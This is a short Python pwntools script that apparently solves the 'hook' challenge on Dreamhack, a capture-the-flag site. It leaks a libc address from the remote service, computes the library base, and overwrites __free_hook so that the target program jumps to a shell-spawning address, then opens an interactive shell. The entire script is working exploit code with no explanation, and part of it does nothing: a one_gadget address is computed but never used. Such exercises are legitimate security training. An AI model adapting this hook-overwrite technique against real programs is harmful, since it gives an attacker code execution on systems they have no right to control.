from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

context.arch ='amd64'
context.log_level ='debug'
p=remote('host3.dreamhack.games',19477)
e=ELF('./hook')
libc=ELF('./libc-2.23.so')

syst = 0x0400A11
one_gadget = 0x4527a # onegadget offset
p.recvuntil(b'stdout: ')
stdo = int(p.recvline()[:-1],16) #stdout 주소 
base = stdo - libc.symbols['_IO_2_1_stdout_'] # base 주소
hook = base + libc.symbols['__free_hook']
one_gadget += base
p.recvuntil(b'Size: ')
p.sendline(b'100')
p.recvuntil(b'Data: ')
payload = p64(hook) + p64(syst)
p.sendline(payload)
p.interactive()

